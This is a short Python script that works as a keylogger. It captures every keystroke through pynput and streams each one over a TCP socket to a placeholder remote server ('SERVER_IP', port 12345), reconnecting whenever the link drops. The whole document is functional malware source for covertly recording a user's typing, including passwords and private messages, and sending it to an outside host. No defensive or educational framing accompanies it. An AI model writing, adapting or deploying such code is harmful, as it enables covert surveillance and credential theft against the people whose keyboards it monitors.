import socket
import time
from pynput import keyboard


def on_key_press(key):
    try:
        message = f"Key pressed: {key.char}"
    except AttributeError:
        message = f"Special key pressed: {key}"
    try:
        s.sendall(message.encode('utf-8'))
    except Exception as e:
        print(f"Error sending data: {e}")
        reconnect()


def on_key_release(key):
    pass


def connect_to_server():
    while True:
        try:
            # Create a socket object
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect to the host machine
            host_ip = 'SERVER_IP'  # Replace 'SERVER_IP' with the IP address of your server
            host_port = 12345
            s.connect((host_ip, host_port))
            return s
        except Exception as e:
            print(f"Connection failed, retrying{e}")


def reconnect():
    global s
    s.close()
    s = connect_to_server()


s = connect_to_server()

try:
    with keyboard.Listener(
            on_press=on_key_press,
            on_release=on_key_release) as listener:
        listener.join()
except Exception as e:
    print(f"Error in listener: {e}")
    reconnect()
